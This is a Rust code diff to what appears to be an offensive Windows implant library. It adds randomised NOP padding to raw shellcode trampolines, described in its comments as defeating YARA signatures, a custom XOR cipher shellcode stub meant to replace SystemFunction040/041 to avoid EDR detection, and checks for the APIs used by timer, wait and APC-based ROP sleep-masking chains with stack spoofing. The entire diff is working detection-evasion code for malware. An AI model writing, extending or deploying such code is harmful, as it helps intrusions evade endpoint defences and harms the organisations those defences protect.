@@ -43,6 +43,9 @@ pub struct Config {
     pub enum_date: WinApi,
     pub system_function040: WinApi,
     pub system_function041: WinApi,
+    /// Custom SIMD XOR cipher stub address (replaces SystemFunction040/041)
+    pub custom_encrypt: u64,
+    pub custom_decrypt: u64,  // Same address as encrypt (XOR is self-inverse)
     pub nt_continue: WinApi,
     pub nt_set_event: WinApi,
     pub rtl_user_thread: WinApi,
@@ -58,15 +61,36 @@ pub struct Config {
     pub zw_wait_for_worker: WinApi,
 }
 
+/// Insert 0-3 random NOP-equivalent instructions to break byte signatures.
+/// Uses RDTSC for randomness to avoid importing RNG APIs.
+fn insert_random_nops(code: &mut alloc::vec::Vec<u8>, seed: u64) {
+    let count = (seed & 0x3) as usize; // 0-3 nops
+    let nop_table: [&[u8]; 5] = [
+        &[0x90],                    // 1-byte nop
+        &[0x66, 0x90],              // 2-byte nop
+        &[0x0F, 0x1F, 0x00],       // 3-byte nop
+        &[0x0F, 0x1F, 0x40, 0x00], // 4-byte nop
+        &[0x48, 0x87, 0xC0],       // xchg rax, rax (nop-equivalent)
+    ];
+    for i in 0..count {
+        let idx = ((seed >> (i * 3 + 4)) as usize) % nop_table.len();
+        code.extend_from_slice(nop_table[idx]);
+    }
+}
+
 impl Config {
     /// Create a new `Config`.
     pub fn new() -> Result<Self> {
         // Resolve hashed function addresses for all required APIs
         let mut cfg = Self::winapis(Self::modules());
+
         cfg.stack = StackSpoof::new(&cfg)?;
         cfg.callback = Self::alloc_callback()?;
         cfg.trampoline = Self::alloc_trampoline()?;
         cfg.wfmo_trampoline = Self::alloc_wfmo_trampoline()?;
+        let cipher = Self::alloc_cipher_stub()?;
+        cfg.custom_encrypt = cipher;
+        cfg.custom_decrypt = cipher;
 
         // Register Control Flow Guard function targets if enabled
         if let Ok(true) = is_cfg_enforced() {
@@ -76,14 +100,94 @@ impl Config {
         Ok(cfg)
     }
 
+    /// Validates APIs required by the **timer** and **wait** ROP chain techniques.
+    ///
+    /// Called per-sleep-attempt so a failure is recoverable (the next cycle can retry)
+    /// rather than poisoning the singleton `Config`.
+    ///
+    /// `uses_handles`: true when `WaitPrimitive::Handles` is in use (checks
+    /// `WaitForMultipleObjects`); false for `Timeout` (checks `WaitForSingleObject`).
+    pub fn validate_timer_wait_apis(&self, uses_handles: bool) -> Result<()> {
+        // Core ROP chain targets (used by every timer/wait cycle)
+        if self.nt_continue.is_null()
+            || self.nt_protect_virtual_memory.is_null()
+            || self.nt_get_context_thread.is_null()
+            || self.nt_set_context_thread.is_null()
+            || self.nt_set_event.is_null()
+            || self.nt_wait_for_single.is_null()
+            || self.rtl_capture_context.is_null()
+            // Stack spoofing targets
+            || self.base_thread.is_null()
+            || self.enum_date.is_null()
+            || self.rtl_user_thread.is_null()
+            || self.rtl_acquire_lock.is_null()
+            || self.zw_wait_for_worker.is_null()
+        {
+            bail!(s!("null API in timer/wait ROP chain"));
+        }
+
+        // Wait-primitive-specific target
+        if uses_handles {
+            if self.wait_for_multiple.is_null() {
+                bail!(s!("null WaitForMultipleObjects"));
+            }
+        } else if self.wait_for_single.is_null() {
+            bail!(s!("null WaitForSingleObject"));
+        }
+
+        Ok(())
+    }
+
+    /// Validates APIs required by the **foliage** (APC) ROP chain technique.
+    ///
+    /// Foliage uses `NtCreateThreadEx` + `NtQueueApcThread` instead of thread pool
+    /// timers, so it needs `rtl_exit_user_thread`, `nt_test_alert`, and
+    /// `tp_release_cleanup` but does NOT need `rtl_capture_context` or `nt_set_event`.
+    pub fn validate_foliage_apis(&self, uses_handles: bool) -> Result<()> {
+        // Core ROP chain targets (foliage-specific)
+        if self.nt_continue.is_null()
+            || self.nt_protect_virtual_memory.is_null()
+            || self.nt_get_context_thread.is_null()
+            || self.nt_set_context_thread.is_null()
+            || self.nt_wait_for_single.is_null()
+            || self.rtl_exit_user_thread.is_null()
+            || self.nt_test_alert.is_null()
+            || self.tp_release_cleanup.is_null()
+            // Stack spoofing targets
+            || self.base_thread.is_null()
+            || self.enum_date.is_null()
+            || self.rtl_user_thread.is_null()
+            || self.rtl_acquire_lock.is_null()
+            || self.zw_wait_for_worker.is_null()
+        {
+            bail!(s!("null API in foliage ROP chain"));
+        }
+
+        // Wait-primitive-specific target
+        if uses_handles {
+            if self.wait_for_multiple.is_null() {
+                bail!(s!("null WaitForMultipleObjects"));
+            }
+        } else if self.wait_for_single.is_null() {
+            bail!(s!("null WaitForSingleObject"));
+        }
+
+        Ok(())
+    }
+
     /// Allocates a small executable memory region used as a trampoline in thread pool callbacks.
+    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
     pub fn alloc_callback() -> Result<u64> {
-        // Trampoline shellcode
-        let callback = &[
-            0x48, 0x89, 0xD1,       // mov rcx,rdx
-            0x48, 0x8B, 0x41, 0x78, // mov rax,QWORD PTR [rcx+0x78] (CONTEXT.RAX)
-            0xFF, 0xE0,             // jmp rax
-        ];
+        // Generate polymorphic trampoline shellcode
+        let seed = unsafe { core::arch::x86_64::_rdtsc() };
+        let mut callback = alloc::vec::Vec::with_capacity(32);
+
+        insert_random_nops(&mut callback, seed);
+        callback.extend_from_slice(&[0x48, 0x89, 0xD1]);       // mov rcx, rdx
+        insert_random_nops(&mut callback, seed >> 8);
+        callback.extend_from_slice(&[0x48, 0x8B, 0x41, 0x78]); // mov rax, [rcx+0x78] (CONTEXT.RAX)
+        insert_random_nops(&mut callback, seed >> 16);
+        callback.extend_from_slice(&[0xFF, 0xE0]);              // jmp rax
 
         // Allocate RW memory for trampoline
         let mut size = callback.len();
@@ -120,14 +224,19 @@ impl Config {
         Ok(addr as u64)
     }
 
-    /// Allocates trampoline memory for the execution of `RtlCaptureContext`
+    /// Allocates trampoline memory for the execution of `RtlCaptureContext`.
+    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
     pub fn alloc_trampoline() -> Result<u64> {
-        // Trampoline shellcode
-        let trampoline = &[
-            0x48, 0x89, 0xD1, // mov rcx,rdx
-            0x48, 0x31, 0xD2, // xor rdx,rdx
-            0xFF, 0x21,       // jmp QWORD PTR [rcx]
-        ];
+        // Generate polymorphic trampoline shellcode
+        let seed = unsafe { core::arch::x86_64::_rdtsc() };
+        let mut trampoline = alloc::vec::Vec::with_capacity(32);
+
+        insert_random_nops(&mut trampoline, seed);
+        trampoline.extend_from_slice(&[0x48, 0x89, 0xD1]); // mov rcx, rdx
+        insert_random_nops(&mut trampoline, seed >> 8);
+        trampoline.extend_from_slice(&[0x48, 0x31, 0xD2]); // xor rdx, rdx
+        insert_random_nops(&mut trampoline, seed >> 16);
+        trampoline.extend_from_slice(&[0xFF, 0x21]);        // jmp [rcx]
 
         // Allocate RW memory for trampoline
         let mut size = trampoline.len();
@@ -177,38 +286,40 @@ impl Config {
     /// - R9:  dwMilliseconds
     /// - [RSP+0x28]: result_ptr - pointer to u64 where result will be stored
     /// - [RSP+0x30]: wfmo_addr - address of WaitForMultipleObjects
+    ///
+    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
+    /// NOPs are inserted between instruction groups that don't affect the stack pointer,
+    /// so the stack offsets (0x60, 0x68) remain correct.
     pub fn alloc_wfmo_trampoline() -> Result<u64> {
-        // Trampoline shellcode that:
-        // 1. Saves RBX and R12 (callee-saved)
-        // 2. Loads result_ptr and wfmo_addr from stack
-        // 3. Calls WaitForMultipleObjects
-        // 4. Stores RAX (result) to [result_ptr]
-        // 5. Restores registers and returns
-        //
-        // Stack layout when called:
-        //   [RSP]      = return address
-        //   [RSP+0x28] = result_ptr (5th param)
-        //   [RSP+0x30] = wfmo_addr (6th param)
-        //
-        // After push rbx, push r12, sub rsp 0x28:
-        //   [RSP+0x60] = result_ptr
-        //   [RSP+0x68] = wfmo_addr
-        let wfmo_trampoline: &[u8] = &[
-            0x53,                         // push rbx
-            0x41, 0x54,                   // push r12
-            0x48, 0x83, 0xEC, 0x28,       // sub rsp, 0x28
-            0x48, 0x8B, 0x5C, 0x24, 0x60, // mov rbx, [rsp+0x60] ; result_ptr
-            0x4C, 0x8B, 0x64, 0x24, 0x68, // mov r12, [rsp+0x68] ; wfmo_addr
-            0x41, 0xFF, 0xD4,             // call r12
-            0x48, 0x89, 0x03,             // mov [rbx], rax
-            0x48, 0x83, 0xC4, 0x28,       // add rsp, 0x28
-            0x41, 0x5C,                   // pop r12
-            0x5B,                         // pop rbx
-            0xC3,                         // ret
-        ];
+        // Generate polymorphic WFMO trampoline shellcode
+        let seed = unsafe { core::arch::x86_64::_rdtsc() };
+        let mut code = alloc::vec::Vec::with_capacity(64);
+
+        // Prologue: save callee-saved registers and allocate shadow space
+        insert_random_nops(&mut code, seed);
+        code.extend_from_slice(&[0x53]);                         // push rbx
+        code.extend_from_slice(&[0x41, 0x54]);                   // push r12
+        code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);       // sub rsp, 0x28
+
+        // Load parameters from stack
+        insert_random_nops(&mut code, seed >> 8);
+        code.extend_from_slice(&[0x48, 0x8B, 0x5C, 0x24, 0x60]); // mov rbx, [rsp+0x60] ; result_ptr
+        code.extend_from_slice(&[0x4C, 0x8B, 0x64, 0x24, 0x68]); // mov r12, [rsp+0x68] ; wfmo_addr
+
+        // Call WaitForMultipleObjects
+        insert_random_nops(&mut code, seed >> 16);
+        code.extend_from_slice(&[0x41, 0xFF, 0xD4]);             // call r12
+
+        // Store result and epilogue
+        insert_random_nops(&mut code, seed >> 24);
+        code.extend_from_slice(&[0x48, 0x89, 0x03]);             // mov [rbx], rax
+        code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);       // add rsp, 0x28
+        code.extend_from_slice(&[0x41, 0x5C]);                   // pop r12
+        code.extend_from_slice(&[0x5B]);                         // pop rbx
+        code.extend_from_slice(&[0xC3]);                         // ret
 
         // Allocate RW memory for trampoline
-        let mut size = wfmo_trampoline.len();
+        let mut size = code.len();
         let mut addr = null_mut();
         if !NT_SUCCESS(NtAllocateVirtualMemory(
             NtCurrentProcess(),
@@ -222,7 +333,7 @@ impl Config {
         }
 
         // Write trampoline bytes to allocated memory
-        unsafe { core::ptr::copy_nonoverlapping(wfmo_trampoline.as_ptr(), addr as *mut u8, wfmo_trampoline.len()) };
+        unsafe { core::ptr::copy_nonoverlapping(code.as_ptr(), addr as *mut u8, code.len()) };
 
         // Change protection to RX for execution
         let mut old_protect = 0;
@@ -237,6 +348,77 @@ impl Config {
         }
 
         // Lock the memory to prevent paging
+        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
+        Ok(addr as u64)
+    }
+
+    /// Allocates a custom SIMD XOR cipher stub for ROP chain memory encryption.
+    /// Replaces SystemFunction040/041 to avoid EDR detection.
+    /// Uses SSE2 PXOR which is self-inverse (encrypt = decrypt).
+    ///
+    /// Calling convention (matches SystemFunction040):
+    ///   RCX = memory pointer
+    ///   RDX = size in bytes  
+    ///   R8  = unused
+    pub fn alloc_cipher_stub() -> Result<u64> {
+        // Generate random 16-byte XOR key using RDTSC
+        let mut key = [0u8; 16];
+        for i in 0..16 {
+            let tsc = unsafe { core::arch::x86_64::_rdtsc() };
+            key[i] = ((tsc >> ((i & 7) * 8)) ^ (tsc >> 32)) as u8;
+            for _ in 0..((tsc & 0xF) + 1) { core::hint::spin_loop(); }
+        }
+
+        // Shellcode: SIMD XOR cipher
+        // 50 bytes of code + 16 bytes of embedded key = 66 bytes total
+        let shellcode_code: [u8; 50] = [
+            0x53,                                     // push rbx
+            0x56,                                     // push rsi
+            0x48, 0x89, 0xCE,                         // mov rsi, rcx        ; data ptr
+            0x89, 0xD1,                               // mov ecx, edx        ; size
+            0xC1, 0xE9, 0x04,                         // shr ecx, 4          ; blocks = size/16
+            0x85, 0xC9,                               // test ecx, ecx
+            0x74, 0x1F,                               // jz .done (+31)
+            0x48, 0x8D, 0x05, 0x1D, 0x00, 0x00, 0x00,// lea rax, [rip+29]   ; -> key
+            0xF3, 0x0F, 0x6F, 0x00,                   // movdqu xmm0, [rax]  ; load key
+            // .loop:
+            0xF3, 0x0F, 0x6F, 0x0E,                   // movdqu xmm1, [rsi]  ; load block
+            0x66, 0x0F, 0xEF, 0xC8,                   // pxor xmm1, xmm0    ; XOR
+            0xF3, 0x0F, 0x7F, 0x0E,                   // movdqu [rsi], xmm1  ; store
+            0x48, 0x83, 0xC6, 0x10,                   // add rsi, 16
+            0xFF, 0xC9,                               // dec ecx
+            0x75, 0xEC,                               // jnz .loop (-20)
+            // .done:
+            0x31, 0xC0,                               // xor eax, eax
+            0x5E,                                     // pop rsi
+            0x5B,                                     // pop rbx
+            0xC3,                                     // ret
+        ];
+
+        let total = shellcode_code.len() + key.len();
+        let mut shellcode = alloc::vec::Vec::with_capacity(total);
+        shellcode.extend_from_slice(&shellcode_code);
+        shellcode.extend_from_slice(&key);
+
+        let mut size = shellcode.len();
+        let mut addr = null_mut();
+        if !NT_SUCCESS(NtAllocateVirtualMemory(
+            NtCurrentProcess(), &mut addr, 0, &mut size,
+            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+        )) {
+            bail!(s!("failed to allocate cipher stub memory"));
+        }
+
+        unsafe { core::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len()) };
+
+        let mut old_protect = 0;
+        if !NT_SUCCESS(NtProtectVirtualMemory(
+            NtCurrentProcess(), &mut addr, &mut size,
+            PAGE_EXECUTE_READ as u32, &mut old_protect
+        )) {
+            bail!(s!("failed to set cipher stub to RX"));
+        }
+
         NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
         Ok(addr as u64)
     }
